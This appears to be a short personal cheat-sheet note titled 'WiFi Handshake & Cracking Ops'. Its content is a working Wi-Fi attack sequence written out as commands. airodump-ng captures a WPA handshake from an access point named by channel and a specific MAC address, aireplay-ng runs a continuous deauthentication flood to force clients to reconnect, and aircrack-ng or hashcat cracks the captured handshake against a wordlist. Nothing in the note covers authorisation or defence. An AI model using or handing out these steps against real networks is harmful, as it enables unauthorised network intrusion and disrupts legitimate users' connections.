---
tags: [ "wifi", "aircrack-ng", "hashcat", "cracking", "red-team" ]
aliases: [ "Handshake Capture", "Deauth Attack" ]
created: 2025-12-21
---

# 📡 WiFi Handshake & Cracking Ops

```bash
airodump-ng wlan0mon

airodump-ng -c 8  -w chico  --bssid   28:11:EC:F2:BA:3C wlan0mon

sudo aireplay-ng --deauth 0    -a  <AP MAC address> -c <Client MAC address>   <interface>

aircrack-ng   <handshake file>   -w <wordlist>
```

or hashcat: hashcat -m 22000 -a 0 <handshake_file> <wordlist>
